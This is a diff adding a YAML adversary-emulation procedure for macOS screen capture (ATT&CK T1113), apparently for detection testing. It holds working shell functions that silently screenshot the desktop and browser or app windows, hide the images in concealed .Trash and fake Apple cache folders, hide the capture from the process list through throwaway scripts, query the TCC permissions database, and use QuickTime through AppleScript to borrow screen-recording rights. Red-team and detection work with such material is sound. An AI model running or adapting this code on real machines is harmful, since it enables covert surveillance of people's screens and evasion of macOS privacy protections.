@@ -1,0 +1,608 @@
+---
+procedure_name: screen_capture
+ttp_id: T1113
+tactic: Collection
+guid: 12345678-1234-5678-9abc-123456789013
+intent: Capture screenshots of the desktop for reconnaissance and data collection
+author: "@darmado | https://x.com/darmad0"
+version: "1.0.0"
+created: "2025-05-28"
+
+procedure:
+  arguments:
+    - option: "-s|--screenshot"
+      description: "Capture a silent screenshot"
+      execute_function:
+        - capture_screenshot
+
+    - option: "-d|--display"
+      description: "Capture screenshot and display info"
+      execute_function:
+        - capture_screenshot_with_info
+
+    - option: "--list-windows"
+      description: "List available windows for targeted screenshot capture"
+      execute_function:
+        - list_available_windows
+
+    - option: "--window-id"
+      description: "Capture screenshot of specific window by ID"
+      execute_function:
+        - capture_window_screenshot
+
+    - option: "--browser-windows"
+      description: "Capture screenshots of all browser windows"
+      execute_function:
+        - capture_browser_windows
+
+    - option: "--app-windows"
+      description: "Capture screenshots of all application windows"
+      execute_function:
+        - capture_app_windows
+
+    - option: "--hidden"
+      description: "Capture screenshot with hidden storage in .Trash"
+      execute_function:
+        - capture_hidden_screenshot
+
+    - option: "--masquerade"
+      description: "Capture screenshot using process name masquerading"
+      execute_function:
+        - capture_masquerade_screenshot
+
+    - option: "--cache"
+      description: "Capture screenshot stored in realistic cache directory"
+      execute_function:
+        - capture_cache_screenshot
+
+    - option: "--osascript"
+      description: "Capture screenshot using osascript/AppleScript interpreter"
+      execute_function:
+        - capture_osascript_screenshot
+
+    - option: "--swift"
+      description: "Capture screenshot using Swift system commands"
+      execute_function:
+        - capture_swift_screenshot
+
+    - option: "--python"
+      description: "Capture screenshot using Python system commands"
+      execute_function:
+        - capture_python_screenshot
+
+    - option: "--tcc-query"
+      description: "Query TCC database for screen recording permissions"
+      execute_function:
+        - query_tcc_permissions
+
+    - option: "--process-scan"
+      description: "Scan for processes that might have screen recording permissions"
+      execute_function:
+        - scan_privileged_processes
+
+    - option: "--tcc-proxy"
+      description: "Find and use apps with existing screen recording permissions"
+      execute_function:
+        - capture_tcc_proxy_screenshot
+
+    - option: "-a|--all-methods"
+      description: "Test ALL screenshot capture methods for maximum detection coverage"
+      execute_function:
+        - capture_screenshot
+        - capture_hidden_screenshot
+        - capture_masquerade_screenshot
+        - capture_cache_screenshot
+        - capture_osascript_screenshot
+        - capture_swift_screenshot
+        - capture_python_screenshot
+        - query_tcc_permissions
+        - scan_privileged_processes
+        - capture_tcc_proxy_screenshot
+
+  global_variable:
+    - name: SCREENSHOT_PATH
+      type: string
+      default_value: "/tmp/ss.jpg"
+    
+    - name: HIDDEN_DIR
+      type: string
+      default_value: "$HOME/.Trash/.ss"
+    
+    - name: CACHE_DIR
+      type: string
+      default_value: "$HOME/Library/Caches/com.apple.screencapture"
+
+  functions:
+    - name: capture_screenshot
+      type: main
+      description: "Capture a silent screenshot"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_screenshot() {
+            printf "SCREENSHOT|capturing|Silent screenshot\\n"
+            
+            # Capture screenshot silently (no sound, no UI)
+            screencapture -x "$SCREENSHOT_PATH"
+            
+            if [ -f "$SCREENSHOT_PATH" ]; then
+                file_size=$(stat -f%z "$SCREENSHOT_PATH")
+                printf "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
+            else
+                printf "SCREENSHOT|failed|Could not capture screenshot\\n"
+            fi
+        }
+
+    - name: capture_screenshot_with_info
+      type: main
+      description: "Capture screenshot and display info"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_screenshot_with_info() {
+            printf "SCREENSHOT|capturing|Screenshot with display info\\n"
+            
+            # Get display information first
+            display_count=$(system_profiler SPDisplaysDataType | grep -c "Resolution:")
+            printf "SCREENSHOT|displays|%s\\n" "$display_count"
+            
+            # Capture screenshot
+            screencapture -x "$SCREENSHOT_PATH"
+            
+            if [ -f "$SCREENSHOT_PATH" ]; then
+                file_size=$(stat -f%z "$SCREENSHOT_PATH")
+                printf "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
+                
+                # Get image dimensions
+                image_info=$(file "$SCREENSHOT_PATH")
+                printf "SCREENSHOT|info|%s\\n" "$image_info"
+            else
+                printf "SCREENSHOT|failed|Could not capture screenshot\\n"
+            fi
+        }
+
+    - name: capture_hidden_screenshot
+      type: main
+      description: "Capture screenshot with hidden storage in .Trash"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_hidden_screenshot() {
+            # Create hidden directory in .Trash
+            mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
+            local output_path="$HOME/.Trash/.ss/$(date +%Y%m%d_%H%M%S).jpg"
+            
+            printf "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\\n"
+            
+            # Direct screencapture to hidden location
+            screencapture -x "$output_path" 2>/dev/null
+            
+            if [ -f "$output_path" ]; then
+                file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                printf "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+            else
+                printf "HIDDEN_SCREENSHOT|failed|capture failed\\n"
+                return 1
+            fi
+        }
+
+    - name: capture_masquerade_screenshot
+      type: main
+      description: "Capture screenshot using process name masquerading"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_masquerade_screenshot() {
+            # Create hidden directory with random name
+            local random_dir="$HOME/.Trash/.$(openssl rand -hex 4)"
+            mkdir -p "$random_dir" 2>/dev/null
+            local output_path="$random_dir/temp_$(date +%s).jpg"
+            
+            printf "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\\n"
+            
+            # Create a temporary script that runs screencapture
+            local temp_script="/tmp/capture_$(openssl rand -hex 4).sh"
+            echo "#!/bin/sh" > "$temp_script"
+            echo "screencapture -x '$output_path'" >> "$temp_script"
+            chmod +x "$temp_script"
+            
+            # Execute via temporary script (hides screencapture in process list)
+            "$temp_script" 2>/dev/null
+            rm -f "$temp_script" 2>/dev/null
+            
+            if [ -f "$output_path" ]; then
+                file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                printf "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+            else
+                printf "MASQUERADE_SCREENSHOT|failed|capture failed\\n"
+                return 1
+            fi
+        }
+
+    - name: capture_cache_screenshot
+      type: main
+      description: "Capture screenshot stored in realistic cache directory"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_cache_screenshot() {
+            # Create realistic cache directory
+            mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
+            local output_path="$HOME/Library/Caches/com.apple.screencapture/capture_$(date +%s).jpg"
+            
+            printf "CACHE_SCREENSHOT|capturing|Using realistic cache directory\\n"
+            
+            # Direct screencapture to cache location
+            screencapture -x "$output_path" 2>/dev/null
+            
+            if [ -f "$output_path" ]; then
+                file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                printf "CACHE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+            else
+                printf "CACHE_SCREENSHOT|failed|capture failed\\n"
+                return 1
+            fi
+        }
+
+    - name: capture_osascript_screenshot
+      type: main
+      description: "Capture screenshot using osascript/AppleScript interpreter"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_osascript_screenshot() {
+            # Create hidden directory in .Trash
+            mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
+            local output_path="$HOME/.Trash/.ss/osascript_$(date +%Y%m%d_%H%M%S).jpg"
+            
+            printf "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\\n"
+            
+            # Use osascript to execute screencapture (may prompt for automation permissions)
+            osascript -e "tell application \"System Events\" to do shell script \"screencapture -x '$output_path'\"" 2>/dev/null
+            
+            if [ -f "$output_path" ]; then
+                file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                printf "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+            else
+                printf "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\\n"
+                return 1
+            fi
+        }
+
+    - name: capture_swift_screenshot
+      type: main
+      description: "Capture screenshot using Swift system commands"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_swift_screenshot() {
+            mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
+            local output_path="$HOME/Library/Caches/com.apple.screencapture/swift_$(date +%s).jpg"
+            
+            printf "SWIFT_SCREENSHOT|capturing|Using Swift Process class (standard library)\\n"
+            
+            # Create temporary Swift script (no external dependencies)
+            local swift_script="/tmp/screenshot_$(openssl rand -hex 4).swift"
+            echo 'import Foundation' > "$swift_script"
+            echo 'let outputPath = CommandLine.arguments[1]' >> "$swift_script"
+            echo 'let process = Process()' >> "$swift_script"
+            echo 'process.launchPath = "/usr/sbin/screencapture"' >> "$swift_script"
+            echo 'process.arguments = ["-x", outputPath]' >> "$swift_script"
+            echo 'process.launch()' >> "$swift_script"
+            echo 'process.waitUntilExit()' >> "$swift_script"
+            echo 'if process.terminationStatus == 0 {' >> "$swift_script"
+            echo '    let fileManager = FileManager.default' >> "$swift_script"
+            echo '    if fileManager.fileExists(atPath: outputPath) {' >> "$swift_script"
+            echo '        if let attributes = try? fileManager.attributesOfItem(atPath: outputPath),' >> "$swift_script"
+            echo '           let fileSize = attributes[FileAttributeKey.size] as? Int64 {' >> "$swift_script"
+            echo '            print("SUCCESS: \\(outputPath) (\\(fileSize) bytes)")' >> "$swift_script"
+            echo '        }' >> "$swift_script"
+            echo '    } else { exit(1) }' >> "$swift_script"
+            echo '} else { exit(1) }' >> "$swift_script"
+            
+            local result=$(swift "$swift_script" "$output_path" 2>/dev/null)
+            rm -f "$swift_script"
+            
+            if echo "$result" | grep -q "SUCCESS:"; then
+                printf "SWIFT_SCREENSHOT|captured|%s\\n" "$result"
+            else
+                printf "SWIFT_SCREENSHOT|failed|capture failed\\n"
+                return 1
+            fi
+        }
+
+    - name: capture_python_screenshot
+      type: main
+      description: "Capture screenshot using Python system commands"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_python_screenshot() {
+            mkdir -p "$HOME/.local/share" 2>/dev/null
+            local output_path="$HOME/.local/share/python_$(openssl rand -hex 4).jpg"
+            
+            printf "PYTHON_SCREENSHOT|capturing|Using Python subprocess (standard library)\\n"
+            
+            # Create temporary Python script (no external dependencies)
+            local python_script="/tmp/screenshot_$(openssl rand -hex 4).py"
+            echo 'import subprocess' > "$python_script"
+            echo 'import sys' >> "$python_script"
+            echo 'import os' >> "$python_script"
+            echo 'output_path = sys.argv[1]' >> "$python_script"
+            echo 'try:' >> "$python_script"
+            echo '    result = subprocess.run(["/usr/sbin/screencapture", "-x", output_path], capture_output=True, text=True, timeout=10)' >> "$python_script"
+            echo '    if result.returncode == 0 and os.path.exists(output_path):' >> "$python_script"
+            echo '        size = os.path.getsize(output_path)' >> "$python_script"
+            echo '        print(f"SUCCESS: {output_path} ({size} bytes)")' >> "$python_script"
+            echo '    else:' >> "$python_script"
+            echo '        sys.exit(1)' >> "$python_script"
+            echo 'except Exception:' >> "$python_script"
+            echo '    sys.exit(1)' >> "$python_script"
+            
+            local result=$(python3 "$python_script" "$output_path" 2>/dev/null)
+            rm -f "$python_script"
+            
+            if echo "$result" | grep -q "SUCCESS:"; then
+                printf "PYTHON_SCREENSHOT|captured|%s\\n" "$result"
+            else
+                printf "PYTHON_SCREENSHOT|failed|capture failed\\n"
+                return 1
+            fi
+        }
+
+    - name: query_tcc_permissions
+      type: main
+      description: "Query TCC database for screen recording permissions"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        query_tcc_permissions() {
+            printf "TCC_QUERY|checking|Screen recording permissions in TCC database\\n"
+            
+            local user_tcc="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
+            local system_tcc="/Library/Application Support/com.apple.TCC/TCC.db"
+            
+            # Check TCC database accessibility
+            if [ -r "$user_tcc" ]; then
+                printf "TCC_QUERY|user_db|Accessible for reading\\n"
+                
+                # Query for screen capture services
+                local screen_services=$(sqlite3 "$user_tcc" "SELECT DISTINCT service FROM access WHERE service LIKE '%Screen%' OR service LIKE '%kTCC%';" 2>/dev/null)
+                if [ -n "$screen_services" ]; then
+                    printf "TCC_QUERY|services|%s\\n" "$screen_services"
+                    
+                    # Get specific permissions
+                    sqlite3 "$user_tcc" "SELECT service, client, auth_value FROM access WHERE service LIKE '%Screen%';" 2>/dev/null | while IFS='|' read -r service client allowed; do
+                        [ -n "$service" ] && printf "TCC_QUERY|permission|%s: %s (auth_value: %s)\\n" "$service" "$client" "$allowed"
+                    done
+                else
+                    printf "TCC_QUERY|services|No screen-related services found\\n"
+                fi
+            else
+                printf "TCC_QUERY|user_db|Protected (normal behavior)\\n"
+            fi
+            
+            # Check system TCC database
+            if [ -r "$system_tcc" ]; then
+                printf "TCC_QUERY|system_db|Accessible (unusual - may indicate compromise)\\n"
+            else
+                printf "TCC_QUERY|system_db|Protected (normal)\\n"
+            fi
+        }
+
+    - name: scan_privileged_processes
+      type: main
+      description: "Scan for processes that might have screen recording permissions"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        scan_privileged_processes() {
+            printf "PROCESS_SCAN|scanning|Processes that might have screen recording permissions\\n"
+            
+            # Screen Time processes (system level)
+            local screen_time_pids=$(pgrep -f "ScreenTime" 2>/dev/null)
+            if [ -n "$screen_time_pids" ]; then
+                printf "PROCESS_SCAN|found|ScreenTime processes: %s\\n" "$screen_time_pids"
+            fi
+            
+            # Look for apps with screen recording capabilities
+            local recording_apps="QuickTime|Screenshot|OBS|Zoom|Teams|Skype|Discord"
+            ps aux | grep -iE "$recording_apps" | grep -v grep | while IFS= read -r process; do
+                local app_name=$(echo "$process" | awk '{print $11}' | xargs basename)
+                local pid=$(echo "$process" | awk '{print $2}')
+                printf "PROCESS_SCAN|potential|%s (PID: %s)\\n" "$app_name" "$pid"
+            done
+            
+            # Check for loginwindow (system process with broad permissions)
+            local loginwindow_pid=$(pgrep loginwindow | head -1)
+            if [ -n "$loginwindow_pid" ]; then
+                printf "PROCESS_SCAN|system|loginwindow (PID: %s) - system process with elevated permissions\\n" "$loginwindow_pid"
+            fi
+        }
+
+    - name: capture_tcc_proxy_screenshot
+      type: main
+      description: "Find and use apps with existing screen recording permissions"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_tcc_proxy_screenshot() {
+            mkdir -p "$HOME/.Trash/.ss/proxy" 2>/dev/null
+            local output_path="$HOME/.Trash/.ss/proxy/tcc_proxy_$(date +%s).jpg"
+            
+            printf "TCC_PROXY|attempting|Using apps with existing permissions\\n"
+            
+            # Try QuickTime Player if available
+            if [ -d "/Applications/QuickTime Player.app" ]; then
+                printf "TCC_PROXY|trying|QuickTime Player\\n"
+                
+                # Attempt to use QuickTime's potential permissions
+                osascript -e 'tell application "QuickTime Player"' -e 'do shell script "screencapture -x '"$output_path"'"' -e 'end tell' 2>/dev/null
+                
+                if [ -f "$output_path" ]; then
+                    file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                    printf "TCC_PROXY|success|QuickTime proxy: %s (%s bytes)\\n" "$output_path" "$file_size"
+                    return 0
+                fi
+            fi
+            
+            # Try Screen Time app if running
+            local screen_time_pid=$(pgrep -f "Screen Time" | head -1)
+            if [ -n "$screen_time_pid" ]; then
+                printf "TCC_PROXY|trying|Screen Time process (PID: %s)\\n" "$screen_time_pid"
+                # This would require more advanced techniques like process injection
+                printf "TCC_PROXY|note|Would require process injection techniques\\n"
+            fi
+            
+            printf "TCC_PROXY|failed|No accessible proxy apps found\\n"
+            return 1
+        }
+
+    - name: list_available_windows
+      type: main
+      description: "List available windows for targeted screenshot capture"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        list_available_windows() {
+            printf "WINDOW_LIST|enumerating|Available windows for capture\\n"
+            
+            # List windows with IDs using screencapture
+            screencapture -l 2>/dev/null | while IFS= read -r line; do
+                if echo "$line" | grep -q "^[[:space:]]*[0-9]"; then
+                    window_id=$(echo "$line" | awk '{print $1}')
+                    window_name=$(echo "$line" | cut -d' ' -f2-)
+                    printf "WINDOW_LIST|found|ID:%s Name:%s\\n" "$window_id" "$window_name"
+                fi
+            done
+            
+            # Also list running applications
+            printf "WINDOW_LIST|apps|Running applications:\\n"
+            osascript -e 'tell application "System Events" to get name of every application process whose visible is true' 2>/dev/null | tr ',' '\n' | while IFS= read -r app; do
+                clean_app=$(echo "$app" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+                printf "WINDOW_LIST|app|%s\\n" "$clean_app"
+            done
+        }
+
+    - name: capture_window_screenshot
+      type: main
+      description: "Capture screenshot of specific window by ID"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_window_screenshot() {
+            mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
+            local output_path="$HOME/.Trash/.ss/window_$(date +%Y%m%d_%H%M%S).jpg"
+            
+            printf "WINDOW_SCREENSHOT|capturing|Capturing specific window\\n"
+            
+            # Get the first available window ID if none specified
+            local window_id=$(screencapture -l 2>/dev/null | grep "^[[:space:]]*[0-9]" | head -1 | awk '{print $1}')
+            
+            if [ -n "$window_id" ]; then
+                # Capture specific window
+                screencapture -x -l "$window_id" "$output_path" 2>/dev/null
+                
+                if [ -f "$output_path" ]; then
+                    file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                    printf "WINDOW_SCREENSHOT|captured|Window ID %s: %s (%s bytes)\\n" "$window_id" "$output_path" "$file_size"
+                else
+                    printf "WINDOW_SCREENSHOT|failed|Could not capture window %s\\n" "$window_id"
+                    return 1
+                fi
+            else
+                printf "WINDOW_SCREENSHOT|failed|No windows available for capture\\n"
+                return 1
+            fi
+        }
+
+    - name: capture_browser_windows
+      type: main
+      description: "Capture screenshots of all browser windows"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_browser_windows() {
+            mkdir -p "$HOME/.Trash/.ss/browsers" 2>/dev/null
+            local captured_count=0
+            
+            printf "BROWSER_SCREENSHOT|capturing|All browser windows (stealth mode)\\n"
+            
+            # Get all windows and filter for browser windows without activating them
+            screencapture -l 2>/dev/null | while IFS= read -r line; do
+                if echo "$line" | grep -q "^[[:space:]]*[0-9]"; then
+                    window_id=$(echo "$line" | awk '{print $1}')
+                    window_name=$(echo "$line" | cut -d' ' -f2-)
+                    
+                    # Check if window belongs to a browser (case insensitive)
+                    if echo "$window_name" | grep -iq -E "(safari|chrome|firefox|edge|brave|opera)"; then
+                        browser_name=$(echo "$window_name" | sed -E 's/.*[[:space:]]([[:alpha:]]+)[[:space:]].*/\1/' | tr '[:upper:]' '[:lower:]')
+                        local output_path="$HOME/.Trash/.ss/browsers/${browser_name}_window_${window_id}_$(date +%s).jpg"
+                        
+                        # Capture specific browser window without activating it
+                        screencapture -x -l "$window_id" "$output_path" 2>/dev/null
+                        
+                        if [ -f "$output_path" ]; then
+                            file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                            printf "BROWSER_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
+                            captured_count=$((captured_count + 1))
+                        fi
+                    fi
+                fi
+            done
+            
+            if [ "$captured_count" -eq 0 ]; then
+                printf "BROWSER_SCREENSHOT|failed|No browser windows found\\n"
+                return 1
+            else
+                printf "BROWSER_SCREENSHOT|summary|Captured %d browser windows (stealth)\\n" "$captured_count"
+            fi
+        }
+
+    - name: capture_app_windows
+      type: main
+      description: "Capture screenshots of all application windows"
+      opsec:
+        check_fda:
+          enabled: false
+      code: |
+        capture_app_windows() {
+            mkdir -p "$HOME/.Trash/.ss/apps" 2>/dev/null
+            local captured_count=0
+            
+            printf "APP_SCREENSHOT|capturing|All application windows\\n"
+            
+            # Get list of all window IDs and capture each
+            screencapture -l 2>/dev/null | grep "^[[:space:]]*[0-9]" | while IFS= read -r line; do
+                window_id=$(echo "$line" | awk '{print $1}')
+                window_name=$(echo "$line" | cut -d' ' -f2- | tr ' /' '_')
+                
+                if [ -n "$window_id" ] && [ "$window_id" != "0" ]; then
+                    local output_path="$HOME/.Trash/.ss/apps/app_${window_id}_$(date +%s).jpg"
+                    
+                    screencapture -x -l "$window_id" "$output_path" 2>/dev/null
+                    
+                    if [ -f "$output_path" ]; then
+                        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                        printf "APP_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
+                        captured_count=$((captured_count + 1))
+                    fi
+                fi
+            done
+            
+            printf "APP_SCREENSHOT|summary|Captured %d application windows\\n" "$captured_count"
+        } 
